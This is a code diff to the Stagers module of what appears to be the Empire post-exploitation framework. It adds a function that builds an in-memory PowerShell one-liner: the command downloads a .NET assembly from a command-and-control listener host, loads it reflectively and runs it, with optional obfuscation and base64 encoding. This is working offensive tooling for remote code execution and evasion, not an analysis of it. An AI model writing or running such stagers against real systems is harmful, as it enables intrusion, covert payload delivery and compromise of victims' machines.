@@ -29,6 +29,7 @@ import macholib.MachO
 
 from empire.server.core.db import models
 from empire.server.core.db.base import SessionLocal
+from empire.server.utils import data_util
 
 from . import helpers
 from .helpers import old_div
@@ -197,6 +198,45 @@ class Stagers(object):
         shellcode = donut.create(file=directory, arch=arch_type)
         return shellcode
 
+    def generate_exe_oneliner(
+        self, language, obfuscate, obfuscation_command, encode, listener_name
+    ):
+        """
+        Generate a oneliner for a executable
+        """
+        listener = self.mainMenu.listenersv2.get_active_listener_by_name(listener_name)
+        host = listener.options["Host"]["Value"]
+        launcher_front = listener.options["Launcher"]["Value"]
+
+        # Encoded launcher requires a sleep
+        launcher = f"""
+        $wc=New-Object System.Net.WebClient;
+        $bytes=$wc.DownloadData("{host}/download/{language}/");
+        $assembly=[Reflection.Assembly]::load($bytes);
+        $assembly.GetType("Program").GetMethod("Main").Invoke($null, $null);
+        """
+
+        if encode:
+            launcher += f"Start-Sleep 5;"
+
+        # Remove comments and make one line
+        launcher = helpers.strip_powershell_comments(launcher)
+        launcher = data_util.ps_convert_to_oneliner(launcher)
+
+        if obfuscate:
+            launcher = self.mainMenu.obfuscationv2.obfuscate(
+                launcher,
+                obfuscation_command=obfuscation_command,
+            )
+        # base64 encode the stager and return it
+        if encode and (
+            (not obfuscate) or ("launcher" not in obfuscation_command.lower())
+        ):
+            return helpers.powershell_launcher(launcher, launcher_front)
+        else:
+            # otherwise return the case-randomized stager
+            return launcher
+
     def generate_python_exe(
         self, python_code, dot_net_version="net40", obfuscate=False
     ):
@@ -206,14 +246,6 @@ class Stagers(object):
         with open(self.mainMenu.installPath + "/stagers/CSharpPy.yaml", "rb") as f:
             stager_yaml = f.read()
         stager_yaml = stager_yaml.decode("UTF-8")
-
-        # Write text file to resources to be embedded
-        with open(
-            self.mainMenu.installPath
-            + "/csharp/Covenant/Data/EmbeddedResources/launcher.txt",
-            "w",
-        ) as f:
-            f.write(python_code)
 
         # Write text file to resources to be embedded
         with open(
